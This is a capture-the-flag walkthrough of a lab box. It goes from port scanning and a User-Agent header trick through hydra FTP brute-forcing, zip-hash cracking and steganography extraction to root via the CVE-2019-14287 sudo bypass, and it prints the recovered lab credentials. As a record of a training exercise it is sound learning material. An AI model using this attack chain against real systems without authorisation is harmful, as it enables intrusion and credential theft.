Target: 10.10.225.156

## Enumeration:

nmap
```bash
$ nmap -sc -sV 10.10.225.156
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-16 06:58 PDT
Nmap scan report for 10.10.225.156
Host is up (0.29s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```


## Foothold:

burpsuite
intercept -> send to repeater > try User-Agent: A,B,C,...
```
GET /agent_C_attention.php HTTP/1.1
Host: 10.10.225.156
User-Agent: C
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1


```

```
HTTP/1.1 200 OK
Date: Fri, 16 Apr 2021 14:15:37 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 177
Connection: close
Content-Type: text/html; charset=UTF-8

Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 


```

hydra
```bash
$ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.255.156 ftp
```

Loot:
chris:crystal

ftp
```bash
$ ftp 10.10.255.156
```

get To_agentJ.txt
```bash
$ cat To_agentJ.txt
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C

```

get cutie.png 
```bash
$ binwalk -e cutie.png
$ cd _cutie.png.extracted 
$ zip2john 8702.zip > hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
> alien
$ 7z x 8702.zip
$ cat To_agentR.txt
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R

```

```bash
$ echo 'QXJlYTUx' | base64 -d
> Area51
```

get cute-alien.jpg 
```bash
$ steghide extract -sf cute-alien.jpg 
$ cat message.txt 
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris

```

Loot:
james:hackerrules!


## Lateral Movement:

## Priv Escalation:

Login
```bash
$ ssh james@10.10.255.156
```

```bash
$ cat user.txt
<redacted>
```

google dorking
site:foxnews.com roswell


```bash
$ sudo -l
<snip>
User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

```bash
$ sudo bash
Sorry, user james is not allowed to execute '/bin/bash' as root on agent-sudo.
```

CVE-2019-14287
[Exploit Link](https://www.exploit-db.com/exploits/47502)

```bash
$ python3 47502.py
```

```bash
$ cat /root/root.txt
<redacted>
```
